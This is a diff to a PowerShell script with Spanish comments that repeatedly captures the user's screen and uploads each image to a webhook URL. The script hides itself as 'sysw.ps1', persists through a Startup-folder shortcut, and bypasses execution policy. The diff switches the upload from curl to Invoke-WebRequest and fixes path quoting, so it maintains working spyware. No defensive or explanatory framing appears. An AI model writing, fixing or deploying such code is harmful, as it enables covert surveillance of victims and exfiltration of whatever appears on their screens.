@@ -29,9 +29,9 @@ do {
     \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
     \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@\$filett" \$hookurl
+    Invoke-WebRequest -Uri \$hookurl -Method POST -InFile \$Filett
     Start-Sleep 1
-    Remove-Item -Path \$filett
+    Remove-Item -Path \$Filett
     Start-Sleep \$seconds
 } while (\$true)
 "@
@@ -40,15 +40,15 @@ do {
 $output = "$env:USERPROFILE\sysw.ps1"
 
 # Guardar el contenido del script principal en un archivo
-Set-Content -Path $output -Value $scriptContent
+Set-Content -Path "$output" -Value $scriptContent
 
 # Creación de acceso directo en la carpeta de inicio del usuario
 $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($shortcutLocation)
 $shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-ExecutionPolicy Bypass -File $output"
+$shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$output`""
 $shortcut.Save()
 
 # Ejecución del script principal
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $output"
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$output`""
